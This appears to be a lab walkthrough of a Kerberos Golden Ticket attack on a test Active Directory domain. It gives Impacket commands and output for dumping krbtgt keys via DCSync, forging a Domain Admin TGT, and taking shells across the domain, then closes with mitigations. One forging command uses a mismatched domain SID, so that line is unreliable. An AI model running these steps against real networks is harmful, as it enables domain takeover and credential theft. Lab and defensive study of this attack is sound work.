## Overview

A **Golden Ticket** is an advanced post-exploitation persistence attack that targets the **entire Active Directory Domain**. By compromising the secret cryptographic key of the built-in `krbtgt` account on a Domain Controller, an attacker can forge a custom **Ticket Granting Ticket (TGT)** offline.

Because the Key Distribution Center (KDC) relies on the `krbtgt` key to sign and encrypt all TGTs, a forged TGT signed with a valid `krbtgt` key will be trusted unconditionally by the Domain Controller. This allows an attacker to inject arbitrary user identities, spoof high-privilege group SIDs (such as Domain Admins or Enterprise Admins), and request access to **any service on any machine across the domain** indefinitely.

```
[ Attacker Workstation (Kali) ] 
  │
  ├── 1. Obtains krbtgt key via DCSync (secretsdump)
  ├── 2. Forges fake TGT offline via impacket-ticketer (Embeds RID 512 Domain Admin PAC)
  └── 3. Presents fake TGT to Domain Controller (KDC)
        │
        ▼
[ Domain Controller / KDC ] ──(Decrypts TGT with krbtgt key)──> "Valid TGT!"
  │
  └──► Issues valid TGS tickets for ANY service across the ENTIRE domain!
```

## Lab Setup

|**Machine / Role**|**OS / Platform**|**Function / Services**|
|---|---|---|
|**Domain Controller (DC01)**|Windows Server 2025|Active Directory, KDC, DNS (`192.168.56.107`)|
|**Attacker Workstation**|Kali Linux|Running Impacket tools (`secretsdump`, `ticketer`, `psexec`)|
|**Target Infrastructure**|Domain-Wide|Target services hosted on domain `pekka.local`|

### Required Attack Prerequisites

- **`krbtgt` Password Key:** NTLM Hash or AES-128/AES-256 Key of the `krbtgt` account.
    
- **Domain Name:** `pekka.local`.
    
- **Domain SID:** Discovered base domain Security Identifier (`S-1-5-21-1268520426-1729529555-2451300255`).
    
- **User & Group SIDs to Spoof:** User `Administrator` with privilege group RIDs:
    
    - RID `512` (Domain Admins)
        
    - RID `513` (Domain Users)
        
    - RID `519` (Enterprise Admins)
        

## Tools Used

- **Impacket (`secretsdump.py`):** Performs DCSync replication over DRSUAPI to extract `NTDS.DIT` hashes and secret keys directly from the DC without running code on the host.
    
- **Impacket (`ticketer.py`):** Constructs offline forged Kerberos TGT tickets complete with customized Privilege Attribute Certificate (PAC) structures.
    
- **Impacket (`psexec.py` / `mssqlclient.py` / `smbclient`):** Authenticates across domain services using the exported forged Kerberos ticket cache (`.ccache`).
    

## Attack Execution Steps

### Step 1: Extracting the `krbtgt` Account Keys via DCSync

Using administrative credentials (`pekka.local/Administrator:'vboxpass'`), `impacket-secretsdump` was executed to perform a DCSync query targeting the `krbtgt` account on the Domain Controller (`192.168.56.107`):

Bash

```shell
impacket-secretsdump pekka.local/Administrator:'vboxpass'@192.168.56.107 -just-dc-user krbtgt
```

#### Command Output

Plaintext

```shell
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:49da5c744637e61982a0f19b7e54fb85:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:6927992e4c3de77db5bfe5f47162d47147bfb75f2955b2eceb156b1467bed4b1
krbtgt:aes128-cts-hmac-sha1-96:8dba98ff15773b6e196a83f913bdaa70
krbtgt:0x17:49da5c744637e61982a0f19b7e54fb85
[*] Cleaning up...
```

- **Extracted NTLM Hash:** `49da5c744637e61982a0f19b7e54fb85`
    
- **Extracted AES-128 Key:** `8dba98ff15773b6e196a83f913bdaa70`
    
- **Extracted AES-256 Key:** `6927992e4c3de77db5bfe5f47162d47147bfb75f2955b2eceb156b1467bed4b1`
    

### Step 2: Forging the Golden Ticket with `impacket-ticketer`

Using the extracted `krbtgt` secret keys and the Domain SID (`S-1-5-21-1268520426-1729529555-2451300255`), `impacket-ticketer` was used to construct a custom offline TGT granting Domain Admin rights.

#### Option A: Forging via NTLM Hash

Bash

```shell
impacket-ticketer -nthash 49da5c744637e61982a0f19b7e54fb85 \
  -domain-sid S-1-5-21-397955417-626891156-188441444 \
  -domain pekka.local Administrator
```

#### Option B: Forging via AES-128 / AES-256 Key (Modern / Hardened DCs)

Bash

```shell
impacket-ticketer -aesKey 8dba98ff15773b6e196a83f913bdaa70 \
  -domain-sid S-1-5-21-1268520426-1729529555-2451300255 \
  -domain pekka.local Administrator
```

#### Output Result

Plaintext

```shell
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for pekka.local/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in Administrator.ccache
```

This operation saves a fully forged Kerberos ticket credential file named `Administrator.ccache`.

### Step 3: Loading and Using the Golden Ticket

Export the forged ticket into the active shell environment variable (`KRB5CCNAME`) to authenticate across domain targets without requiring a password:

Bash

```shell
# Export ticket cache into memory
export KRB5CCNAME=Administrator.ccache

# Interactive Command Shell on Domain Controller (DC01)
impacket-psexec pekka.local/Administrator@dc01.pekka.local -k -no-pass

# Administrative Access to Database Server (MSSQL)
impacket-mssqlclient sqlserver.pekka.local -k -no-pass

# Full C$ Share Access on Any File Server
smbclient //file-server.pekka.local/c$ -k -no-pass
```

## MITRE ATT&CK Mapping

|**Tactic**|**Technique**|**Sub-Technique / Description**|
|---|---|---|
|**Credential Access**|**[T1003 - OS Credential Dumping](https://attack.mitre.org/techniques/T1003/)**|**[T1003.006 - DCSync](https://attack.mitre.org/techniques/T1003/006/)**: Replicating Directory Services data via DRSUAPI to dump `krbtgt` account keys.|
|**Credential Access**|**[T1558 - Steal or Forge Kerberos Tickets](https://attack.mitre.org/techniques/T1558/)**|**[T1558.001 - Golden Ticket](https://attack.mitre.org/techniques/T1558/001/)**: Forging valid TGT tickets using stolen `krbtgt` keys to gain complete, persistent domain control.|
|**Persistence**|**[T1078 - Valid Accounts](https://attack.mitre.org/techniques/T1078/)**|**[T1078.002 - Domain Accounts](https://attack.mitre.org/techniques/T1078/002/)**: Utilizing forged administrative credentials to maintain unrestricted lateral movement across domain hosts.|

## Defensive Recommendations & Mitigation

- **Double Reset of `krbtgt` Password:** To completely invalidate active and forged Golden Tickets, the `krbtgt` password must be reset **twice**. The first reset updates the current key, while the second reset purges the previous key stored in Active Directory history. Allow time between resets for domain replication.
    
- **Restrict DCSync Rights:** Monitor and strictly limit which accounts possess `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` permissions.
    
- **Enable PAC Validation:** Enforce strict Key Distribution Center (KDC) PAC signature checks and deploy Domain Controller security patches that detect invalid or non-matching Kerberos ticket signatures.
    
- **Audit Security Logs:**
    
    - Monitor Domain Controller **Security Event ID 4662** (_An operation was performed on an object_) for unauthorized DRSUAPI credential replication calls.
        
    - Monitor host **Security Event ID 4624** / **4672** for abnormal logon sessions utilizing long-lifetime TGT tickets.
        

## Verification Checklist

[x] `krbtgt` NTLM and AES keys dumped via DCSync (`secretsdump`).
    
[x] Custom TGT forged with Domain Admin PAC privileges using `impacket-ticketer`.
    
[x] Ticket cache file (`Administrator.ccache`) successfully exported into session memory.
    
[x] Domain-wide administrative shell access verified via `psexec`, `mssqlclient`, and `smbclient` using Kerberos authentication (`-k -no-pass`)